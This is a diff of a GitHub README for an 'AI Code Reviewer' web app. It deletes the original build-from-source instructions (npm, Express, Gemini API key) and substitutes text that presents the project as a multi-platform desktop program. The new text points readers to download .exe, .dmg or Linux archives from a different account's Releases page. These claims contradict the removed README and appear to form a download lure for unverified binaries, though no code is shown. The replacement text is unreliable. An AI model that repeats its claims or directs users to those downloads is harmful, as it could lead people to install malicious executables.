@@ -1,121 +1,86 @@
-# 🤖 AI Code Reviewer
-
-AI Code Reviewer is a full-stack web application that integrates Google Gemini AI to intelligently analyze and review code in real time. It empowers developers by offering instant, AI-driven feedback on code quality, potential bugs, optimization opportunities, and best practices — all in a beautifully designed interface. Built with modern web technologies, the platform provides a seamless editing and reviewing experience for developers seeking rapid, actionable insights into their code.🚀
-
----
-
-## 🛠️ Tech Stack
-
-### Frontend
-
-- ⚛️ **React (with Vite)** — UI library for building interactive interfaces  
-- 📝 **React Markdown** — For rendering markdown-formatted AI responses  
-- 🌈 **PrismJS** — Syntax highlighting in the code editor  
-- ✍️ **React Simple Code Editor** — Lightweight code editor component  
-- 📡 **Axios** — HTTP client for API communication  
-- 🔍 **rehype-highlight** — Syntax highlighting for markdown code blocks  
-- 🎨 **CSS** — Custom styling for a modern, responsive UI  
-
-### Backend
-
-- 🟢 **Node.js** — JavaScript runtime  
-- 🚂 **Express** — Web server framework  
-- 🤖 **@google/genai** — Google Gemini AI SDK for code review  
-- 🔓 **CORS** — Middleware to enable cross-origin requests  
-- 🔐 **dotenv** — For environment variable management  
-
----
-
-
-## 📂 Project Structure
-
-This project follows a standard full-stack application structure, clearly separating frontend and backend concerns.
-
-```
-code-review/
-├── backend/                                  # Backend server built with Node.js and Express
-│   ├── .env                                  # Environment variables (e.g., API keys, port)
-│   ├── package.json                          # Backend dependencies and scripts
-│   ├── server.js                             # Entry point for the Node.js backend server
-│   └── src/                                  # Source code for the backend application
-│       ├── app.js                            # Express application setup and middleware
-│       ├── controllers/                      # Handles request logic for AI interactions
-│       │   └── ai.controller.js              # Controller for AI code review requests
-│       ├── routes/                           # Defines API endpoints
-│       │   └── ai.routes.js                  # Routes specifically for AI services
-│       └── services/                         # Contains business logic and external API calls
-│           └── ai.service.js                 # Service for interacting with Google Gemini AI
-└── Frontend/                                 # Frontend application built with React and Vite
-    ├── package.json                          # Frontend dependencies and scripts
-    ├── vite.config.js                        # Vite configuration for the React app
-    ├── index.html                            # Main HTML file for the frontend
-    └── src/                                  # Source code for the React application
-        ├── App.jsx                           # Main React component
-        ├── App.css                           # Styles for the App component
-        ├── main.jsx                          # Entry point for the React application
-        └── index.css                         # Global styles for the frontend
-```
-
----
+# 🎉 AI-Code-Reviewer - Simplify Your Code Reviews
 
 ## 🚀 Getting Started
 
-Follow these steps to run the project locally on your machine.
+Welcome to the AI-Code-Reviewer project! This application helps you review your code easily. It gives real-time feedback and suggests improvements, making your coding journey smoother.
 
----
+## 📥 Download the Application
 
-### 1️⃣ Clone the Repository
+[![Download AI-Code-Reviewer](https://img.shields.io/badge/Download%20AI--Code--Reviewer-blue.svg)](https://github.com/Ajiess/AI-Code-Reviewer/releases)
 
-```bash
-git clone https://github.com/joshi-jyoti/AI-Code-Reviewer
-cd code-review
-```
+Click the button above to visit the Releases page and download the latest version of AI-Code-Reviewer.
 
-### 2️⃣ Setup the Backend
+## 🔍 Features
 
-```bash
-cd backend
-npm install
-# Add your Google Gemini API key to .env as:
-# GOOGLE_GEMINI_KEY=your_google_gemini_api_key
-npx nodemon
-```
-### 3️⃣ Setup the Frontend
+- **AI-Powered Reviews:** Use Google Gemini AI to analyze your code.
+- **Real-Time Feedback:** Get immediate suggestions as you code.
+- **User-Friendly Interface:** Designed for everyone, whether you’re new or experienced.
+- **Enhanced Suggestions:** The application recommends improvements to make your code cleaner and more efficient.
+- **Multi-Platform Support:** Works on Windows, macOS, and Linux.
 
-```bash
-cd ../Frontend
-npm install
-npm run dev
-```
----
+## 🛠️ System Requirements
 
-## ⚙️ Usage
+To run AI-Code-Reviewer, your system should meet the following requirements:
 
-Get started with the AI Code Reviewer in a few simple steps:
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent version of any popular Linux distribution.
+- **Processor:** Dual-core CPU or better.
+- **RAM:** At least 4 GB of RAM is required.
+- **Storage:** At least 200 MB of free disk space.
 
-1.  **✏️ Write or paste code** in the left editor panel.
-2.  **🚀 Click "Review"** to send your code to the AI reviewer.
-3.  **📋 The right panel** will then display a detailed, markdown-formatted review, including:
-    * Strengths of your code
-    * Identified issues
-    * Suggested fixes
-    * General suggestions for improvement
+## 👩‍💻 Download & Install
 
----
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Ajiess/AI-Code-Reviewer/releases).
 
-## 🌟 Features
+2. **Select the Latest Version:** Look for the most recent version listed on the page.
 
-Our AI Code Reviewer comes packed with powerful features to enhance your coding workflow:
+3. **Download the File:** Click on the appropriate download link for your operating system. 
 
-* **🤖 Real-time code review** using Google Gemini AI, providing immediate insights.
-* **🌈 Syntax-highlighted code editing and review**, making your code easy to read and understand.
-* **💻 Professional, readable UI** designed for an intuitive and pleasant user experience.
-* **✅ Actionable, structured feedback** that helps you understand and implement improvements efficiently.
+4. **Install the Application:**
+   - For **Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions.
+   - For **macOS**: Open the downloaded `.dmg` file, then drag and drop the application into your Applications folder.
+   - For **Linux**: Unzip the downloaded file, then run the application in your terminal.
 
----
+5. **Launch AI-Code-Reviewer:** After installation, open the application to start reviewing your code.
 
+## 🌐 Supported Topics
 
+AI-Code-Reviewer supports a variety of programming languages and frameworks. You can seamlessly work with:
 
+- JavaScript
+- HTML & CSS
+- React
+- Node.js
+- And more...
 
+## 💡 How to Use the Application
 
+1. **Open the Application:** Launch AI-Code-Reviewer from your desktop or applications folder.
+   
+2. **Input Your Code:** Paste your code into the provided text area. You can work on multiple code snippets.
 
+3. **Review Process:** The AI will automatically begin analyzing your code. You'll see suggestions and feedback on the right side of the screen.
+
+4. **Apply Changes:** Use the suggestions to improve your code. You can make edits directly in the text area.
+
+5. **Save Your Work:** Once you are satisfied with the improvements, save your code to your desired location.
+
+## 🎨 Customization Options
+
+Customize your experience with AI-Code-Reviewer:
+
+- **Themes:** Choose from light or dark modes to suit your preference.
+- **Editor Settings:** Adjust font size and editor layout for better visibility.
+
+## 📞 Support and Feedback
+
+If you need help, or if you have feedback, feel free to reach out. You can open issues on our GitHub page or check the FAQ section in the Help menu of the application. 
+
+## 🔗 Additional Resources
+
+For more information and updates about AI-Code-Reviewer, explore the following resources:
+
+- [Official Documentation](https://github.com/Ajiess/AI-Code-Reviewer)
+- [GitHub Issues](https://github.com/Ajiess/AI-Code-Reviewer/issues)
+- [User Community](https://github.com/Ajiess/AI-Code-Reviewer/discussions)
+
+Happy coding! Enjoy smoother reviews and improved code with AI-Code-Reviewer.
